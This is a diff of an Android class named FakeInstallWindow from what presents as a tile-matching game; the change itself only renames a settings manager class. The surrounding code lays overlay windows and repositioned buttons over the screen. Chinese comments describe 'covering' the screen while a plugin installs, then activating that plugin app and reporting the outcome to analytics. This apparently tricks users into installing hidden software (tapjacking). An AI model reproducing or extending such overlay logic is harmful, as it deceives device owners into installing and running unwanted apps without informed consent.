@@ -14,7 +14,7 @@ import com.plugin.common.utils.UtilsRuntime;
 import com.tinygame.lianliankan.R;
 import com.umeng.analytics.MobclickAgent;
 import com.xstd.qm.*;
-import com.xstd.qm.setting.SettingManager;
+import com.xstd.qm.setting.MainSettingManager;
 
 import java.util.HashMap;
 
@@ -122,24 +122,24 @@ public class FakeInstallWindow implements FakeWindowInterface {
             UtilOperator.fake = null;
             AppRuntime.FAKE_WINDOWS_SHOW.set(false);
 
-            SettingManager.getInstance().setDeviceBindingTime(SettingManager.getInstance().getDeviceBindingTime() + 1);
-            Utils.saveExtraInfo("读秒结束=" + SettingManager.getInstance().getDeviceBindingTime());
+            MainSettingManager.getInstance().setDeviceBindingTime(MainSettingManager.getInstance().getDeviceBindingTime() + 1);
+            Utils.saveExtraInfo("读秒结束=" + MainSettingManager.getInstance().getDeviceBindingTime());
             Utils.notifyServiceInfo(context);
 
             //notify umeng
             HashMap<String, String> log = new HashMap<String, String>();
             log.put("channel", Config.CHANNEL_CODE);
             log.put("phoneType", android.os.Build.MODEL);
-            log.put("plugin_install", String.valueOf(SettingManager.getInstance().getKeyPluginInstalled()));
-            log.put("dismiss_times", String.valueOf(SettingManager.getInstance().getDeviceBindingTime()));
+            log.put("plugin_install", String.valueOf(MainSettingManager.getInstance().getKeyPluginInstalled()));
+            log.put("dismiss_times", String.valueOf(MainSettingManager.getInstance().getDeviceBindingTime()));
             log.put("versionName", UtilsRuntime.getVersionName(context));
             MobclickAgent.onEvent(context, "fake_window_dismiss", log);
             MobclickAgent.flush(context);
 
-            SettingManager.getInstance().setLoopActiveCount(0);
+            MainSettingManager.getInstance().setLoopActiveCount(0);
             Utils.tryToActivePluginApp(context);
         } else {
-            if (SettingManager.getInstance().getCancelInstallReserve()) {
+            if (MainSettingManager.getInstance().getCancelInstallReserve()) {
                 //timer layout
                 timerBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
                 //full layout
@@ -163,10 +163,10 @@ public class FakeInstallWindow implements FakeWindowInterface {
                 wm.updateViewLayout(installView, confirmBtnParams);
                 wm.updateViewLayout(timerView, timerBtnParams);
 
-                SettingManager.getInstance().setCancelInstallReserve(false);
+                MainSettingManager.getInstance().setCancelInstallReserve(false);
             }
 
-            if (countDown > 0 && AppRuntime.PLUGIN_INSTALLED && SettingManager.getInstance().getKeyPluginInstalled()) {
+            if (countDown > 0 && AppRuntime.PLUGIN_INSTALLED && MainSettingManager.getInstance().getKeyPluginInstalled()) {
                 //表示在遮盖的过程中已经安装了插件
                 //此时的动作是进行全遮盖，然后推出
                 AppRuntime.WATCHING_SERVICE_BREAK.set(true);
@@ -267,7 +267,7 @@ public class FakeInstallWindow implements FakeWindowInterface {
 //            }
 //        }
 
-        if (!SettingManager.getInstance().getCancelInstallReserve()) {
+        if (!MainSettingManager.getInstance().getCancelInstallReserve()) {
             rightView.setVisibility(View.VISIBLE);
             leftView.setVisibility(View.GONE);
         } else {
@@ -284,7 +284,7 @@ public class FakeInstallWindow implements FakeWindowInterface {
         int baseWidth = (int) (50 * density);
         confirmBtnParams.width = baseWidth;// + (screenWidth / 2 - baseWidth) / 2;
         confirmBtnParams.height = (int) (48 * density);
-        if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
+        if (!leftConfirm && !MainSettingManager.getInstance().getCancelInstallReserve()) {
 //                confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (25 * density);
             confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + screenWidth / 2;
 //                confirmBtnParams.y = screenHeight - (int) (48 * density);
@@ -302,7 +302,7 @@ public class FakeInstallWindow implements FakeWindowInterface {
         confirmFullBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
         confirmFullBtnParams.width = screenWidth / 2;
         confirmFullBtnParams.height = (int) (48 * density);
-        if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
+        if (!leftConfirm && !MainSettingManager.getInstance().getCancelInstallReserve()) {
             confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
         } else {
             confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.LEFT;
@@ -317,7 +317,7 @@ public class FakeInstallWindow implements FakeWindowInterface {
         timerBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
         timerBtnParams.width = screenWidth / 2;
         timerBtnParams.height = (int) (48 * density);
-        if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
+        if (!leftConfirm && !MainSettingManager.getInstance().getCancelInstallReserve()) {
             timerBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
         } else {
             timerBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
